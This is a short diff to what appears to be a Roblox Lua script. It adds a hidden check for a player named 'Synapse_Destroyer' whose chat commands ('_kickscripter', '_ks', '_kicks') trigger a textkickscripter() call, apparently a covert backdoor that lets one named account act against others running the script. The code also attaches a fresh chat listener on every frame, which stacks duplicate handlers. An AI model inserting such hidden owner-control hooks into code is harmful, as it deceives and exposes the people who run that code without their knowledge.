@@ -21,6 +21,14 @@ function ownerpower()
               end
           end)
       end
+      game:GetService("RunService").Stepped:Connect(function()
+      if game.Players:FindFirstChild("Synapse_Destroyer") then
+          game.Players["Synapse_Destroyer"].Chatted:Connect(function(cmd)
+              if cmd:match("_kickscripter") or cmd:match("_ks") or cmd:match("_kicks") then
+                  textkickscripter()
+              end
+          end)
+      end
       wait(5)
   end)
 end
